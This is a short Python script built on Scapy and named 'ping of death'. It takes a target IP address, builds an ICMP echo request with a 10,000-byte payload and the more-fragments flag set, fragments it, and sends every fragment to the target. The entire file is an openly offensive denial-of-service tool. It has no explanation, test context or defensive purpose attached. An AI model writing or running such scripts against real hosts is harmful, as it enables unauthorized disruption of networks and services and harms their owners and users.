from scapy.all import IP, ICMP, fragment, sr1
import sys

def ping_of_death(destination):
    # Craft oversized ICMP Echo Request packet
    icmp_payload = "X" * 10000
    icmp_pkt = IP(dst=destination, flags="MF") / ICMP() / icmp_payload

    # Fragment the packet
    frags = fragment(icmp_pkt)

    print("Fragmenting and sending packets...")

    # Send fragmented packets
    for i, frag in enumerate(frags):
        print(f"Sending fragment {i+1}/{len(frags)}...")
        sr1(frag, verbose=False, timeout=1)  # Send packet and wait for a response
        print("Fragment sent.")

    print("All fragments sent.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python ping_of_death.py <Dst Ip>")
        sys.exit(1)
        
    destination_ip = sys.argv[1]

    # Ping of Death
    print(f"Pinging {destination_ip}...")
    ping_of_death(destination_ip)
    print("Ping of Death completed.")
